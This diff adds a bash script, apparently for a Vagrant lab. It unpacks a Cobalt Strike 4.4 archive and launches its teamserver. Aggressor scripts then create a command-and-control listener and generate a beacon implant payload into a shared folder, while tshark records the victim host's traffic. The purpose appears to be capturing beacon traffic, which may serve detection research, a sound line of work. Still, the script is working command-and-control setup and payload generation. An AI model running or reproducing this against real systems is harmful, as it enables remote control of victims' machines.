@@ -1,0 +1,51 @@
+#!/bin/bash
+
+unzip /vagrant/Cobaltstrike-4.4.zip
+cd CSAgent
+chmod 755 teamserver agscript
+
+tmux new-session -d -s collector -n teamserver 'sudo ./teamserver $ts_host $ts_password'
+echo "Team server starting ..."
+
+sleep 20  # wait for teamserver starting
+
+cat << EOF > /tmp/listener.cna
+on ready {
+  listener_create_ext("my listener", "$payload", %(host => "$ts_host", port => $ts_port));
+  println("Existing listeners:");
+  printAll(listeners());
+}
+
+on beacon_initial {
+  println("A beacon initialized!");
+}
+
+on beacon_checkin {
+  println("A beacon checkin!");
+}
+EOF
+
+# tmux new-window -t collector -n listener './agscript $ts_host 50050 neo $ts_password /tmp/listener.cna &> /tmp/listener.log'
+tmux new-window -t collector -n listener './agscript $ts_host 50050 neo $ts_password /tmp/listener.cna'
+echo "Listener starting ..."
+
+sleep 10  # wait for listener starting
+
+cat << 'EOF' > /tmp/beacon.cna
+on ready {
+  println("Existing listeners:");
+  printAll(listeners());
+  $$data = payload("my listener", "$arch", "process", "Direct");
+  $$handle = openf(">/vagrant/data/$beacon_file");
+  writeb($$handle, $$data);
+  closef($$handle);
+}
+EOF
+
+# tmux new-window -t collector -n beacon './agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna &> /tmp/beacon.log'
+tmux new-window -t collector -n beacon './agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna'
+echo "Generating beacon ..."
+
+tmux new-window -t collector -n tshark 'tshark -i $server_nic -f "tcp and host $victim_host" -c $packet_cnt -w /vagrant/data/$pcap_file_name'
+
+tmux ls
